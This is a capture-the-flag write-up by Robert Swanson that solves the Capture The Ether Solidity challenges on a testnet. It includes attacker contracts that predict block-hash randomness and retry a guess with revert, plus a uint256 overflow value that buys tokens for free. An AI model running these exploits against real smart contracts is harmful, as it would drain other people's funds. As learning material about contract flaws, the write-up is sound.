# Capture The Ether

*Robert Swanson*

### Deploy a contract (50pts)

I just followed the instructions. Installed metamask, got some ropsten ether and pressed the red buttton to deploy.

### Call me (100pts)

```
pragma solidity ^0.4.21;

contract CallMeChallenge {
    bool public isComplete = false;

    function callme() public {
        isComplete = true;
    }
}
```

I compiled this code in remix and loaded in the contract at the address given by *Capture the Ether* and clicked the button to call the `callme()` function.

### Choose a nickname (200pts)

I chose the nickname "Rob" converted the ascii to hex, and filled in with 29 null bytes to pass in a 32 byte value to the `setNickname(bytes32 nickname)` function.

### Guess the number (200pts)

I called the `guess(uint8 n)` function with the value 42 and made sure to add a value of 1 eth to the transaction.

### Guess the secret number (300pts)

I used a keccak256 online hash tool to try every hex number between `0x00` and `0xFF` until the hash came to equal `0xdb81b...`. Then I called `guess()` with that value.

### Guess the random number (300pts)

I compiled and deployed the contract in solidity at the same time as deploying the contract made by *Capture the Ether* so that both transactions were included in the same block and thus the same answer was acquired in both. I then used remix's debugging feature to inspect the answer, which I then passed into `guess()`.

### Guess the new number (400pts)

```
pragma solidity ^0.4.21;

import "guess-the-new-number.sol";

contract SolveGuessTheNewNumberChallenge {
    GuessTheNewNumberChallenge public challenge;
    
    function SolveGuessTheNewNumberChallenge(address _challengeAddress) public payable {
        challenge = GuessTheNewNumberChallenge(_challengeAddress);
    }

    function attack() external payable {
        require(msg.value == 1 ether);
        bytes32 bhash = block.blockhash(block.number - 1);
        bytes32 khash = keccak256(bhash, now);
        uint8 guess = uint8(khash);
        challenge.guess.value(1 ether)(guess);
    }
    
    function () external payable {
        
    }
}
```

I created and deployed this contract in remix, passing in the given address for `_challengeAddress`. I then called my contract's `attack()` function (with a value of `1 eth`). This function calculates the guess in the exact same way that their contract does and then makes the call to `challenge.guess.value(1 ether)(guess)`. The called contract then calculates the hash based off of the same "random" numbers and so the value is the same and the ether is sent to my custom contract. To facilitate this I needed to add a default payable function.

### Token sale (500pts)

I exploited the bounds of the `uint256` datatype to perform a integer overflow attack on this contract. Because the value of `PRICE_PER_TOKEN` is `1 ether` which is actually the integer value 1000000000000000000, the expression `require(msg.value == numTokens * PRICE_PER_TOKEN);` is vulnerable.

To find the number to pass into `buy(uint256 numTokens)`, I debugged the contract in remix. Because `1 ether` is between $2^{59}$ and $2^{60}$ satoshi, I found that passing in the value of $2^{140}$ would overflow the 256-bit number. I found that this resulted an a value of 0, so that the `buy()` function was requireing `msg.value == 0`. Thus I could call `buy(1766847064778384329583297500742918515827483896875618958121606201292619776)` without passing in any ether, and my balance would be increased by  $2^{140}$ tokens. All I had to do then was to call `sell(1)` to solve the problem.

## Assume ownership (300pts)

For this one, I simply had to call `AssumeOwnershipChallange()` to claim ownership. I then called `authenticate()` and the points were mine

## Predict the future (500pts)

```
pragma solidity ^0.4.21;

import "predict.sol";

contract SolvePredict {
    PredictTheFutureChallenge public challenge;
    
    function SolvePredict(address _challengeAddress) public payable {
        require(msg.value == 1 ether);
        challenge = PredictTheFutureChallenge(_challengeAddress);
        challenge.lockInGuess.value(1 ether)(0);
    }
    

    function attack() external payable {
        challenge.settle();
        if (!challenge.isComplete()) {
            revert();
        }
    }
    
    function () external payable {
        
    }
}
```

For this one I created this contract which would lock in the guess upon creation, and would call the `settle()` function safely for me. By this I mean that calling my `attack()` function would `revert()` if the challenge was not completed and thus no ether would be lost. I then created the contract which locked in the value and then called `attack()` 3 times until it worked